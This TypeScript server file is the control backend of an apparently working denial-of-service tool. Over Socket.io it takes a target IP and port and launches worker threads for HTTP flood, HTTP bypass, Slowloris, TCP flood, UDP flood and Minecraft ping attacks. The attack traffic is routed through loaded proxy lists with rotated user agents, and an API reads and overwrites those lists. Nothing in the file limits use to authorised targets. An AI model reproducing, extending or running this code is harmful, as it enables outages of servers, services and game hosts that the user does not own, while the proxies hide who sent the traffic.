import express from "express";
import { readFileSync, writeFileSync } from "fs";
import { createServer } from "http";
import { dirname, join } from "path";
import { Server } from "socket.io";
import { fileURLToPath } from "url";
import { Worker } from "worker_threads";
import bodyParser from "body-parser";

import { currentPath, loadProxies, loadUserAgents } from "./fileLoader";
import { AttackMethod } from "./lib";
import { filterProxies } from "./proxyUtils";

/* ------------------ Workers ------------------ */

const attackWorkers: Record<AttackMethod, string> = {
  http_flood: "./workers/httpFloodAttack.js",
  http_bypass: "./workers/httpBypassAttack.js",
  http_slowloris: "./workers/httpSlowlorisAttack.js",
  tcp_flood: "./workers/tcpFloodAttack.js",
  minecraft_ping: "./workers/minecraftPingAttack.js",
  udp_flood: "./workers/udpFloodAttack.js",
};

/* ------------------ Setup ------------------ */

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const __prod = process.env.NODE_ENV === "production";

const app = express();
const httpServer = createServer(app);

const io = new Server(httpServer, {
  cors: {
    origin: __prod ? "" : "http://localhost:5173",
    methods: ["GET", "POST"],
  },
});

const proxies = loadProxies();
const userAgents = loadUserAgents();

console.log("Proxies loaded:", proxies.length);
console.log("User agents loaded:", userAgents.length);

app.use(express.static(join(__dirname, "public")));

/* ------------------ Socket ------------------ */

io.on("connection", (socket) => {
  console.log("Client connected");

  socket.emit("stats", {
    pps: 0,
    bots: proxies.length,
    totalPackets: 0,
    log: "🍤 Connected to the server.",
  });

  socket.on("startAttack", (params) => {
    const {
      target,
      duration,
      packetDelay,
      packetSize,
      attackMethod,
    } = params as {
      target: string;
      duration: number;
      packetDelay: number;
      packetSize: number;
      attackMethod: AttackMethod;
    };

    /* ---------- Parse ip:port ---------- */

    let host = target.trim();
    let targetPort = 80;

    // Default ports per attack
    if (attackMethod === "minecraft_ping") targetPort = 25565;
    if (attackMethod.startsWith("http")) targetPort = 80;

    if (host.includes(":")) {
      const [h, p] = host.split(":");
      host = h;
      targetPort = parseInt(p, 10);
    }

    if (!host || Number.isNaN(targetPort) || targetPort < 1 || targetPort > 65535) {
      socket.emit("stats", {
        log: "❌ Invalid target format. Use IP or IP:PORT",
      });
      return;
    }

    /* ---------- Worker ---------- */

    const filteredProxies = filterProxies(proxies, attackMethod);
    const workerFile = attackWorkers[attackMethod];

    if (!workerFile) {
      socket.emit("stats", {
        log: `❌ Unsupported attack type: ${attackMethod}`,
      });
      return;
    }

    socket.emit("stats", {
      log: `🍒 Using ${filteredProxies.length} proxies`,
      bots: filteredProxies.length,
    });

    const worker = new Worker(join(__dirname, workerFile), {
      workerData: {
        target: host,
        targetPort,
        proxies: filteredProxies,
        userAgents,
        duration,
        packetDelay,
        packetSize,
      },
    });

    worker.on("message", (msg) => socket.emit("stats", msg));

    worker.on("error", (err) => {
      console.error("Worker error:", err);
      socket.emit("stats", { log: `❌ Worker error: ${err.message}` });
    });

    worker.on("exit", () => socket.emit("attackEnd"));

    (socket as any).worker = worker;
  });

  socket.on("stopAttack", () => {
    const worker = (socket as any).worker;
    if (worker) {
      worker.terminate();
      socket.emit("attackEnd");
    }
  });

  socket.on("disconnect", () => {
    const worker = (socket as any).worker;
    if (worker) worker.terminate();
    console.log("Client disconnected");
  });
});

/* ------------------ Config API ------------------ */

app.get("/configuration", (_req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");
  res.setHeader("Content-Type", "application/json");

  const proxiesText = readFileSync(
    join(currentPath(), "data", "proxies.txt"),
    "utf-8"
  );
  const uasText = readFileSync(
    join(currentPath(), "data", "uas.txt"),
    "utf-8"
  );

  res.send({
    proxies: btoa(proxiesText),
    uas: btoa(uasText),
  });
});

app.post("/configuration", bodyParser.json(), (req, res) => {
  res.setHeader("Access-Control-Allow-Origin", "http://localhost:5173");

  const proxies = atob(req.body.proxies);
  const uas = atob(req.body.uas);

  writeFileSync(join(currentPath(), "data", "proxies.txt"), proxies);
  writeFileSync(join(currentPath(), "data", "uas.txt"), uas);

  res.send("OK");
});

/* ------------------ Start ------------------ */

const PORT = Number(process.env.PORT) || 3000;

httpServer.listen(PORT, () => {
  console.log(
    __prod
      ? `Production running on :${PORT}`
      : `Dev server running on :${PORT}`
  );
});
